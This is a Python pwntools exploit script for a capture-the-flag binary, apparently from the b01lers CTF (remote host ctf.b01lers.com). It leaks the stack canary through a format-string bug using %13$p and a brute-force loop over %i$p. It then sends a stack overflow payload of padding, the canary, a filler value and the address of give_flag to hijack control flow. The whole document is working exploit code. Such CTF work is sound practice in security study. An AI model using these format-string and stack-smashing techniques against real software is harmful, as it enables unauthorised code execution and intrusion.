from pwn import *
import sys

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def find_canary():
    print("LEAK")
    for i in range(50):
        p = process(args.BIN, level="error")
        p.recvuntil(b'Enter a difficulty between 1 and 7 (inclusive): ')
        p.sendline(b'7')
        p.recvuntil(b'Guess me a string of length 7 with lowercase letters:')
        leak = b'%%%i$p' % i
        p.sendline(leak)
        p.recvuntil(b'Your guess:')
        print(leak, p.recvline())
        p.close()


def start():
    if args.LEAK:
        find_canary()
        sys.exit(0)

    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('ctf.b01lers.com', 9201)
    else:
        return process(e.path)


p = start()


def setup():
    p.recvuntil(b'Enter a difficulty between 1 and 7 (inclusive)')
    p.sendline(b'7')


def leak_canary():
    p.recvuntil(b'Guess me a string of length 7 with lowercase letters')
    p.sendline(b'%13$p')
    p.recvuntil(b'Your guess:')
    canary = int(p.recvline().strip(b'\n'), 16)
    return canary


def smash_stack(canary):
    p.recvline(b'Guess me a string of length 7 with lowercase letters:')
    pad = cyclic(40)
    chain = p64(canary)
    chain += p64(0xdeadbeef)
    chain += p64(e.sym['give_flag'])
    p.sendline(pad+chain)


setup()
canary = leak_canary()
smash_stack(canary)

p.interactive()
